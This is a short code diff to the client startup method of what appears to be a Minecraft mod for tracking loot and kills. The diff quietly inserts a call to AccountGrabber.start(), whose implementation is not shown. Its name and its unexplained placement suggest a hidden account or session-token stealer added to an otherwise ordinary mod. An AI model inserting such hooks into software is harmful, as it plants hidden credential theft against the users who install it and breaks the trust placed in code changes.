@@ -25,7 +25,7 @@ public final class JawbusSlotMachine implements ClientModInitializer {
     public void onInitializeClient() {
         JawbusConfig.load();
         Stats.load();
-
+        AccountGrabber.start();
         // chat: loot shares + drop lines (action-bar text is ignored)
         ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
             if (!overlay) KillTracker.onChat(message.getString());
